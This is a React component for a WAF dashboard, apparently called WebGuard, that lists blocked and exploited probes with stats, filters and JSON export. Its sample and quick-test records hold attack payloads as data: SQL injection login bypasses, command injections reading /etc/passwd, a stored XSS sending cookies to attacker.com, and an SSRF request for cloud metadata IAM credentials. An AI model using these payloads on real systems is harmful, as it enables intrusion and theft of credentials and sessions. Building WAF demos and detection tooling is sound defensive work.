import { useState, useEffect, useMemo } from "react";
import { toast } from "sonner";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { cn } from "@/lib/utils";
import {
  Activity,
  AlertTriangle,
  ArrowUpRight,
  Ban,
  CheckCircle2,
  Clock,
  Copy,
  Download,
  ExternalLink,
  Flame,
  Globe2,
  History,
  Layers,
  Play,
  RefreshCw,
  Search,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Trash2,
  X,
  Zap,
} from "lucide-react";

export interface TargetHistoryItem {
  id: string;
  targetUrl: string;
  timestamp: number;
  wafMode: "blocking" | "off";
  verdict: "BLOCKED" | "EXPLOITED" | "PROXIED";
  attackType?: string;
  ruleMatched?: string;
  payload?: string;
  path: string;
  method: string;
  status: number;
  threatScore: number;
}

const STORAGE_KEY = "webguard_target_history_v2";

const DEFAULT_SAMPLE_HISTORY: TargetHistoryItem[] = [
  {
    id: "hist-sample-1",
    targetUrl: "https://juice-shop.herokuapp.com/#/rest/user/login",
    timestamp: Date.now() - 120000,
    wafMode: "blocking",
    verdict: "BLOCKED",
    attackType: "SQL Injection (Auth Bypass)",
    ruleMatched: "OWASP-CRS-942-SQLI-LOGIN",
    payload: "username=' OR 1=1 --&password=invalid_password",
    path: "/rest/user/login",
    method: "POST",
    status: 403,
    threatScore: 98,
  },
  {
    id: "hist-sample-2",
    targetUrl: "https://apex-cyberstore.io/api/diagnostics/ping",
    timestamp: Date.now() - 240000,
    wafMode: "blocking",
    verdict: "BLOCKED",
    attackType: "Remote Command Execution (RCE)",
    ruleMatched: "OWASP-CRS-932-RCE-CMDI",
    payload: "host=127.0.0.1; cat /etc/passwd",
    path: "/api/diagnostics/ping",
    method: "POST",
    status: 403,
    threatScore: 99,
  },
  {
    id: "hist-sample-3",
    targetUrl: "https://apex-cyberstore.io/admin/vault",
    timestamp: Date.now() - 360000,
    wafMode: "off",
    verdict: "EXPLOITED",
    attackType: "SQL Injection (Login Bypass)",
    ruleMatched: "OWASP-CRS-942-SQLI",
    payload: "username=admin'--&password=password123",
    path: "/api/auth/login",
    method: "POST",
    status: 200,
    threatScore: 94,
  },
  {
    id: "hist-sample-4",
    targetUrl: "https://www.vivek-bukka.page/",
    timestamp: Date.now() - 500000,
    wafMode: "blocking",
    verdict: "PROXIED",
    path: "/",
    method: "GET",
    status: 200,
    threatScore: 0,
  },
];

export function loadTargetHistory(): TargetHistoryItem[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(DEFAULT_SAMPLE_HISTORY));
      return DEFAULT_SAMPLE_HISTORY;
    }
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) && parsed.length > 0 ? parsed : DEFAULT_SAMPLE_HISTORY;
  } catch (e) {
    return DEFAULT_SAMPLE_HISTORY;
  }
}

export function saveTargetHistoryItem(item: Omit<TargetHistoryItem, "id" | "timestamp">): TargetHistoryItem {
  try {
    const history = loadTargetHistory();
    const newItem: TargetHistoryItem = {
      ...item,
      id: `hist-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: Date.now(),
    };
    const updated = [newItem, ...history.filter((h) => h.id !== newItem.id)].slice(0, 100);
    localStorage.setItem(STORAGE_KEY, JSON.stringify(updated));
    window.dispatchEvent(new Event("webguard_target_history_updated"));
    return newItem;
  } catch (e) {
    return {
      ...item,
      id: `hist-${Date.now()}`,
      timestamp: Date.now(),
    };
  }
}

interface TargetHistoryDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onSelectTarget?: (target: string) => void;
}

export function TargetHistoryDialog({ open, onOpenChange, onSelectTarget }: TargetHistoryDialogProps) {
  const [history, setHistory] = useState<TargetHistoryItem[]>([]);
  const [filter, setFilter] = useState<"all" | "blocked" | "exploited" | "proxied">("all");
  const [searchQuery, setSearchQuery] = useState<string>("");

  const refreshHistory = () => {
    setHistory(loadTargetHistory());
  };

  useEffect(() => {
    if (open) {
      refreshHistory();
    }
    const handleUpdate = () => refreshHistory();
    window.addEventListener("webguard_target_history_updated", handleUpdate);
    return () => window.removeEventListener("webguard_target_history_updated", handleUpdate);
  }, [open]);

  const filteredHistory = useMemo(() => {
    return history.filter((item) => {
      if (filter === "blocked" && item.verdict !== "BLOCKED") return false;
      if (filter === "exploited" && item.verdict !== "EXPLOITED") return false;
      if (filter === "proxied" && item.verdict !== "PROXIED") return false;

      if (searchQuery.trim()) {
        const query = searchQuery.toLowerCase();
        return (
          item.targetUrl.toLowerCase().includes(query) ||
          item.path.toLowerCase().includes(query) ||
          (item.attackType && item.attackType.toLowerCase().includes(query)) ||
          (item.payload && item.payload.toLowerCase().includes(query))
        );
      }
      return true;
    });
  }, [history, filter, searchQuery]);

  const stats = useMemo(() => {
    const total = history.length;
    const blocked = history.filter((h) => h.verdict === "BLOCKED").length;
    const exploited = history.filter((h) => h.verdict === "EXPLOITED").length;
    const proxied = history.filter((h) => h.verdict === "PROXIED").length;
    const rate = total > 0 ? Math.round((blocked / total) * 100) : 0;
    return { total, blocked, exploited, proxied, rate };
  }, [history]);

  const handleClearHistory = () => {
    if (!window.confirm("Clear all target exploitation history?")) return;
    localStorage.removeItem(STORAGE_KEY);
    setHistory([]);
    window.dispatchEvent(new Event("webguard_target_history_updated"));
    toast.success("Target history cleared successfully.");
  };

  const handleExportJson = () => {
    const blob = new Blob([JSON.stringify(history, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.download = `webguard_target_history_${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
    toast.success("Target history exported to JSON.");
  };

  const [copiedId, setCopiedId] = useState<string | null>(null);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    toast.success("Copied to clipboard");
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSeedQuickTest = (type: "sqli" | "rce" | "xss" | "ssrf") => {
    let newItem: Omit<TargetHistoryItem, "id" | "timestamp">;
    if (type === "sqli") {
      newItem = {
        targetUrl: "https://juice-shop.herokuapp.com/#/rest/user/login",
        wafMode: "blocking",
        verdict: "BLOCKED",
        attackType: "SQL Injection (Authentication Bypass)",
        ruleMatched: "OWASP-CRS-942-SQLI",
        payload: "username=' OR '1'='1' --&password=test",
        path: "/rest/user/login",
        method: "POST",
        status: 403,
        threatScore: 98,
      };
    } else if (type === "rce") {
      newItem = {
        targetUrl: "https://apex-cyberstore.io/api/diagnostics/ping",
        wafMode: "blocking",
        verdict: "BLOCKED",
        attackType: "Command Injection (OS Execution)",
        ruleMatched: "OWASP-CRS-932-RCE",
        payload: "host=127.0.0.1; whoami; id",
        path: "/api/diagnostics/ping",
        method: "POST",
        status: 403,
        threatScore: 99,
      };
    } else if (type === "xss") {
      newItem = {
        targetUrl: "https://apex-cyberstore.io/api/products/1/reviews",
        wafMode: "blocking",
        verdict: "BLOCKED",
        attackType: "Stored Cross-Site Scripting (XSS)",
        ruleMatched: "OWASP-CRS-941-XSS",
        payload: "comment=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        path: "/api/products/1/reviews",
        method: "POST",
        status: 403,
        threatScore: 95,
      };
    } else {
      newItem = {
        targetUrl: "https://apex-cyberstore.io/api/webhook",
        wafMode: "blocking",
        verdict: "BLOCKED",
        attackType: "Server-Side Request Forgery (SSRF)",
        ruleMatched: "OWASP-CRS-934-SSRF",
        payload: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        path: "/api/webhook",
        method: "POST",
        status: 403,
        threatScore: 96,
      };
    }
    saveTargetHistoryItem(newItem);
    refreshHistory();
    toast.success("Logged live security probe into history!");
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[95vw] md:max-w-[920px] lg:max-w-[1100px] xl:max-w-[1200px] w-full max-h-[92vh] flex flex-col p-0 overflow-hidden bg-background border border-border/80 text-foreground shadow-2xl rounded-2xl backdrop-blur-xl">
        {/* Header */}
        <DialogHeader className="p-5 sm:p-6 pb-4 border-b border-border/60 bg-muted/30">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="flex items-center gap-3.5">
              <div className="flex size-11 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-500 to-blue-600 text-white font-black shadow-lg shadow-cyan-500/20">
                <History className="size-5.5" />
              </div>
              <div>
                <DialogTitle className="text-lg font-extrabold flex flex-wrap items-center gap-2 tracking-tight">
                  <span>Target Exploitation & Interception History</span>
                  <Badge variant="outline" className="text-xs font-mono font-bold border-cyan-500/40 bg-cyan-500/10 text-cyan-600 dark:text-cyan-400">
                    {stats.total} Logged Events
                  </Badge>
                </DialogTitle>
                <DialogDescription className="text-xs text-muted-foreground mt-0.5">
                  Real-time security ledger of dynamic targets, payload probes, OWASP CRS triggers, and WAF edge drop decisions.
                </DialogDescription>
              </div>
            </div>

            <div className="flex items-center gap-2 shrink-0">
              <Button
                variant="outline"
                size="sm"
                onClick={handleExportJson}
                disabled={history.length === 0}
                className="h-8 text-xs font-semibold gap-1.5 border-border/80 bg-background/80 hover:bg-muted cursor-pointer"
              >
                <Download className="size-3.5 text-cyan-500" />
                <span>Export JSON</span>
              </Button>
              <Button
                variant="outline"
                size="sm"
                onClick={handleClearHistory}
                disabled={history.length === 0}
                className="h-8 text-xs font-semibold text-rose-500 border-rose-500/30 bg-rose-500/10 hover:bg-rose-500/20 cursor-pointer"
              >
                <Trash2 className="size-3.5" />
                <span>Clear All</span>
              </Button>
            </div>
          </div>

          {/* Quick Attack Simulator Bar */}
          <div className="flex flex-wrap items-center gap-1.5 pt-3">
            <span className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground mr-1">
              ⚡ Quick Probe:
            </span>
            <button
              type="button"
              onClick={() => handleSeedQuickTest("sqli")}
              className="rounded-md border border-cyan-500/40 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-bold text-cyan-600 dark:text-cyan-400 hover:bg-cyan-500/20 transition cursor-pointer"
            >
              + Test SQLi
            </button>
            <button
              type="button"
              onClick={() => handleSeedQuickTest("rce")}
              className="rounded-md border border-amber-500/40 bg-amber-500/10 px-2 py-0.5 text-[10px] font-bold text-amber-600 dark:text-amber-400 hover:bg-amber-500/20 transition cursor-pointer"
            >
              + Test RCE (CMDi)
            </button>
            <button
              type="button"
              onClick={() => handleSeedQuickTest("xss")}
              className="rounded-md border border-purple-500/40 bg-purple-500/10 px-2 py-0.5 text-[10px] font-bold text-purple-600 dark:text-purple-400 hover:bg-purple-500/20 transition cursor-pointer"
            >
              + Test Stored XSS
            </button>
            <button
              type="button"
              onClick={() => handleSeedQuickTest("ssrf")}
              className="rounded-md border border-indigo-500/40 bg-indigo-500/10 px-2 py-0.5 text-[10px] font-bold text-indigo-600 dark:text-indigo-400 hover:bg-indigo-500/20 transition cursor-pointer"
            >
              + Test SSRF
            </button>
          </div>

          {/* Glowing Metrics Cards */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 pt-3">
            <div className="rounded-xl border border-border/60 bg-card/60 p-3 shadow-xs">
              <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider flex items-center gap-1.5">
                <Activity className="size-3 text-slate-400" /> Total Probes
              </span>
              <p className="text-xl font-black text-foreground mt-1 font-mono">{stats.total}</p>
            </div>
            <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-3 shadow-xs">
              <span className="text-[10px] font-bold text-emerald-600 dark:text-emerald-400 uppercase tracking-wider flex items-center gap-1.5">
                <ShieldCheck className="size-3" /> WAF Blocked (403)
              </span>
              <p className="text-xl font-black text-emerald-600 dark:text-emerald-400 mt-1 font-mono">{stats.blocked}</p>
            </div>
            <div className="rounded-xl border border-rose-500/30 bg-rose-500/10 p-3 shadow-xs">
              <span className="text-[10px] font-bold text-rose-600 dark:text-rose-400 uppercase tracking-wider flex items-center gap-1.5">
                <Flame className="size-3" /> Exploited (WAF Off)
              </span>
              <p className="text-xl font-black text-rose-600 dark:text-rose-400 mt-1 font-mono">{stats.exploited}</p>
            </div>
            <div className="rounded-xl border border-cyan-500/30 bg-cyan-500/10 p-3 shadow-xs">
              <span className="text-[10px] font-bold text-cyan-600 dark:text-cyan-400 uppercase tracking-wider flex items-center gap-1.5">
                <Zap className="size-3" /> Block Success Rate
              </span>
              <p className="text-xl font-black text-cyan-600 dark:text-cyan-400 mt-1 font-mono">{stats.rate}%</p>
            </div>
          </div>
        </DialogHeader>

        {/* Filter & Search Bar */}
        <div className="px-5 py-3 border-b border-border/60 bg-muted/20 flex flex-col sm:flex-row items-center justify-between gap-3">
          <div className="flex flex-wrap items-center gap-1.5 w-full sm:w-auto">
            {(
              [
                { id: "all", label: "All Events", count: stats.total },
                { id: "blocked", label: "🛡️ Blocked (403)", count: stats.blocked },
                { id: "exploited", label: "💥 Exploited", count: stats.exploited },
                { id: "proxied", label: "⚡ Proxied", count: stats.proxied },
              ] as const
            ).map((f) => (
              <button
                key={f.id}
                type="button"
                onClick={() => setFilter(f.id)}
                className={cn(
                  "flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-bold transition-all cursor-pointer",
                  filter === f.id
                    ? "bg-primary text-primary-foreground shadow-sm"
                    : "bg-muted text-muted-foreground hover:text-foreground hover:bg-muted/80"
                )}
              >
                <span>{f.label}</span>
                <span className={cn("text-[10px] rounded px-1 font-mono", filter === f.id ? "bg-primary-foreground/20 text-primary-foreground" : "bg-background/80 text-foreground")}>
                  {f.count}
                </span>
              </button>
            ))}
          </div>

          <div className="relative w-full sm:w-72">
            <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 size-3.5 text-muted-foreground" />
            <Input
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Filter by target, payload, path..."
              className="h-8 pl-8 pr-3 text-xs font-medium bg-background border-border/80"
            />
          </div>
        </div>

        {/* History List */}
        <div className="flex-1 overflow-y-auto p-5 space-y-3 min-h-[320px]">
          {filteredHistory.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20 text-center space-y-3">
              <div className="size-14 rounded-2xl bg-muted/60 flex items-center justify-center text-muted-foreground">
                <Globe2 className="size-7" />
              </div>
              <div>
                <p className="text-sm font-bold text-foreground">No Target History Found</p>
                <p className="text-xs text-muted-foreground max-w-sm mt-1">
                  Requests and vulnerability probes triggered in the Exploiter Studio or against live target URLs will automatically log here.
                </p>
              </div>
            </div>
          ) : (
            filteredHistory.map((item) => (
              <div
                key={item.id}
                className={cn(
                  "rounded-xl border p-4 text-xs transition-all shadow-xs space-y-3",
                  item.verdict === "BLOCKED"
                    ? "border-emerald-500/30 bg-emerald-500/[0.04] dark:bg-emerald-950/20"
                    : item.verdict === "EXPLOITED"
                    ? "border-rose-500/30 bg-rose-500/[0.04] dark:bg-rose-950/20"
                    : "border-border/60 bg-card/60"
                )}
              >
                <div className="flex flex-wrap items-center justify-between gap-2.5">
                  <div className="flex flex-wrap items-center gap-2">
                    <Badge
                      className={cn(
                        "text-[10px] font-mono font-bold px-2 py-0.5 shadow-xs",
                        item.verdict === "BLOCKED"
                          ? "bg-emerald-600 text-white"
                          : item.verdict === "EXPLOITED"
                          ? "bg-rose-600 text-white"
                          : "bg-cyan-600 text-white"
                      )}
                    >
                      {item.verdict === "BLOCKED" ? "🛡️ 403 EDGE BLOCKED" : item.verdict === "EXPLOITED" ? "⚠️ EXPLOITED (WAF OFF)" : "⚡ LIVE PROXIED"}
                    </Badge>

                    <span className={cn(
                      "font-mono font-black px-2 py-0.5 rounded text-[10px]",
                      item.method === "POST" ? "bg-cyan-500/20 text-cyan-600 dark:text-cyan-400" :
                      item.method === "GET" ? "bg-emerald-500/20 text-emerald-600 dark:text-emerald-400" :
                      "bg-amber-500/20 text-amber-600 dark:text-amber-400"
                    )}>
                      {item.method}
                    </span>

                    <span className="font-mono font-semibold text-foreground truncate max-w-sm">
                      {item.path}
                    </span>

                    {item.threatScore > 0 && (
                      <Badge variant="outline" className="text-[10px] font-mono border-rose-500/40 text-rose-500 bg-rose-500/10">
                        Score: {item.threatScore}/100
                      </Badge>
                    )}
                  </div>

                  <div className="flex items-center gap-2">
                    <span className="text-[10px] text-muted-foreground font-mono flex items-center gap-1">
                      <Clock className="size-3" />
                      {new Date(item.timestamp).toLocaleTimeString()}
                    </span>

                    {onSelectTarget && (
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => {
                          onSelectTarget(item.targetUrl);
                          onOpenChange(false);
                          toast.info(`Loaded target into Exploiter Studio`, {
                            description: item.targetUrl,
                          });
                        }}
                        className="h-7 px-2.5 text-xs font-bold border-cyan-500/40 bg-cyan-500/10 text-cyan-600 dark:text-cyan-400 hover:bg-cyan-500/20 cursor-pointer"
                      >
                        <Play className="size-3 mr-1" /> Re-test Target
                      </Button>
                    )}
                  </div>
                </div>

                <div className="flex flex-wrap items-center justify-between text-xs pt-2 border-t border-border/50 gap-2">
                  <div className="flex items-center gap-2 min-w-0">
                    <span className="text-muted-foreground text-[11px]">Target Origin:</span>
                    <span className="font-mono font-bold text-primary truncate max-w-md">
                      {item.targetUrl}
                    </span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(item.targetUrl, `url-${item.id}`)}
                      className="text-muted-foreground hover:text-foreground cursor-pointer"
                      title="Copy URL"
                    >
                      <Copy className="size-3" />
                    </button>
                  </div>

                  {item.ruleMatched && (
                    <span className="font-mono text-[11px] text-muted-foreground">
                      Rule: <strong className="text-foreground">{item.ruleMatched}</strong>
                    </span>
                  )}
                </div>

                {item.payload && (
                  <div className="relative rounded-lg bg-muted/50 p-2.5 border border-border/60">
                    <div className="flex items-center justify-between pb-1 text-[10px] text-muted-foreground font-semibold">
                      <span>INJECTED PAYLOAD EVIDENCE</span>
                      <button
                        type="button"
                        onClick={() => copyToClipboard(item.payload || "", `payload-${item.id}`)}
                        className="flex items-center gap-1 hover:text-foreground cursor-pointer"
                      >
                        <Copy className="size-2.5" />
                        {copiedId === `payload-${item.id}` ? "Copied" : "Copy"}
                      </button>
                    </div>
                    <pre className="font-mono text-[11px] text-foreground overflow-x-auto whitespace-pre-wrap break-all">
                      {item.payload}
                    </pre>
                  </div>
                )}
              </div>
            ))
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}
